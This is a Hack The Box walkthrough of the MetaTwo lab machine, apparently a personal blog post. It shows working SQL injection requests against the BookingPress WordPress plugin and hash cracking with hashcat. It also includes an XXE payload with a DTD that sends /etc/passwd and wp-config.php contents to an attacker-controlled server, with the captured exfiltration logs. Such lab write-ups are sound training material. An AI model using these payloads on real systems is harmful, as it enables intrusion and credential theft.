---
layout: post
title: Hack The Box Walkthrough - MetaTwo
date: 2022-11-05
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/11/HTB/MetaTwo
img: 2022/11/MetaTwo/MetaTwo.png
---

This is a fun box where I got to exploit two WordPress vulnerabilities and then crack the password for a command line password vault.

* Room: MetaTwo
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/MetaTwo](https://app.hackthebox.com/machines/MetaTwo)
* Author: [Nauten](https://app.hackthebox.com/users/27582)

## Open Ports

As always, I started the box by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.                                                                                                 
Open 10.129.14.57:22
Open 10.129.14.57:21
Open 10.129.14.57:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-05 16:06 EDT

...

Host is up, received syn-ack (0.026s latency).
Scanned at 2022-11-05 16:06:09 EDT for 228s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp?    syn-ack
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPp9LmBKMOuXu2ZOpw8JorL5ah0sU0kIBXvJB8LX26rpbOhw+1MPdhx6ptZzXwQ8wkQc88xu5h+oB8NGkeHLYhvRqtZmvkTpOsyJiMm+0Udbg+IJCENPiKGSC5J+0tt4QPj92xtTe/f7WV4hbBLDQust46D1xVJVOCNfaloIC40BtWoMWIoEFWnk7U3kwXcM533
6LuUnhm69XApDB4y/dt5CgXFoWlDQi45WLLQGbanCNAlT9XwyPnpIyqQdF7mRJ5yRXUOXGeGmoO9+JALVQIEJ/7Ljxts6QuV633wFefpxnmvTu7XX9W8vxUcmInIEIQCmunR5YH4ZgWRclT+6rzwRQw1DH1z/ZYui5Bjn82neoJunhweTJXQcotBp8glpvq3X/rQgZASSyYrOJghBlNVZDqPzp4vBC78gn6TyZyuJXh
Dxw+lHxF82IMT2fatp240InLVvoWrTWlXlEyPiHraKC0okOVtul6T0VRxsuT+QsyU7pdNFkn2wDVvC25AW8=
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB1ZmNogWBUF8MwkNsezebQ+0/yPq7RX3/j9s4Qh8jbGlmvAcN0Z/aIBrzbEuTRf3/cHehtaNf9qrF2ehQAeM94=
|   256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOP4kxBr9kumAjfplon8fXJpuqhdMJy2rpd3FM7+mGw2
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The machine had 3 ports open.
* 21 - FTP
* 22 - SSH
* 80 - HTTP

I tried anonymous login on the FTP server, but I got access denied.

## Website

I opened my browser to the website and got redirected to metapress.htb. I added that to my hosts file and reloaded the site.

![Main Site](/assets/images/2022/11/MetaTwo/MainSite.png "Main Site")

The site was clearly a WordPress site. I launched WPScan to look for vulnerable plugins and enumerate users. 

```bash
$ wpscan --url http://metapress.htb/ -e vp,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.129.14.57]
[+] Started: Sat Nov  5 16:19:19 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov  5 16:19:24 2022
[+] Requests Done: 53
[+] Cached Requests: 8
[+] Data Sent: 15.825 KB
[+] Data Received: 300.65 KB
[+] Memory used: 238.281 MB
[+] Elapsed time: 00:00:05
```

It found two users. I tried brute forcing their passwords, but it failed.

The only post on the site was pointing to an Events page.

![Events](/assets/images/2022/11/MetaTwo/Events.png "Events")

This looked like it was built by a plugin. I tried to identify it so I could look for known vulnerabilities. WPScan was not finding the plugin. I looked at the files that were loaded and saw `http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking`.


## SQL Injection

The BookingPress plugin had a know [SQL Injection vulnerability](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) in versions before 1.0.11. I didn't know the version used on the site, so I tried it to see if it worked.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=3g6qeg9je4c1gi07q438vsh235; wordpress_test_cookie=WP%20Cookie%20check

action=bookingpress_front_get_category_services&category_id=1&_wpnonce=6f1820f2b5&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

It worked. I got some information about the server and the numbers returned.

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 05 Nov 2022 20:42:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.24
Access-Control-Allow-Origin: http://metapress.htb
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 529

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

I used the vulnerability to extract the users and their hashed passwords from the database.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 218
Origin: http://metapress.htb
Connection: close
Referer: http://metapress.htb/events/
Cookie: PHPSESSID=3g6qeg9je4c1gi07q438vsh235; wordpress_test_cookie=WP%20Cookie%20check

action=bookingpress_front_get_category_services&category_id=1&_wpnonce=6f1820f2b5&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,id,user_login,user_pass,4,5,id from wp_users-- -'
```

It returned the two users I already knew about.

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 05 Nov 2022 20:48:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.0.24
Access-Control-Allow-Origin: http://metapress.htb
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Content-Length: 1134

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"admin","bookingpress_service_duration_unit":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"1","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$2.00","bookingpress_service_duration_val":"manager","bookingpress_service_duration_unit":"$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"2","service_price_without_currency":2,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

I saved the hashes in a file and used hashcat to see if I could crack them.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt

hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2873/5810 MB (1024 MB allocatable), 6MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

....
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:REDACTED
```

It found the password for `manager`, but not for `admin`.

## XXE

I connected as manager. I only had access to my profile and the media library.

![Media Library](/assets/images/2022/11/MetaTwo/MediaLibrary.png "Media Library")

I tried uploading some malicious files, but it failed. The site was rejecting everything I sent.

I knew the site was using version 5.6.2 of WordPress so I looked for [vulnerabilities in that version](https://wpscan.com/wordpress/562). I found an [XML external entity (XXE)](https://portswigger.net/web-security/xxe) vulnerability on [HackerOne](https://hackerone.com/reports/1095645). 

I downloaded the proof of concept from there and tried it. It was a WAV file that extracted a Document Type Definition (DTD) from a web server. I modified it to read the DTD from my machine.

```xml
<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "http://10.10.14.143/xxe.dtd"> %sp; %param1; ]> <r>&exfil;</r>< 
```

The DTD read a file from the system and converted it to base64. It then sent the encoded content to a web server.

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.143/?%data;'>">
```

I started a web server on my machine and uploaded the WAV file to the media library.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.14.57 - - [05/Nov/2022 20:57:15] "GET /xxe.dtd HTTP/1.1" 200 -
10.129.14.57 - - [05/Nov/2022 20:57:15] "GET /?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
```

I decoded the payload and got the content of `/etc/passwd` on the server.

```bash
$ echo -n cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

Next, I used the same technique to read `wp-config.php`. 

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.143/?%data;'>">
```

```bash
0.129.14.57 - - [05/Nov/2022 21:00:09] "GET /xxe.dtd HTTP/1.1" 200 -
10.129.14.57 - - [05/Nov/2022 21:00:09] "GET /?PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVV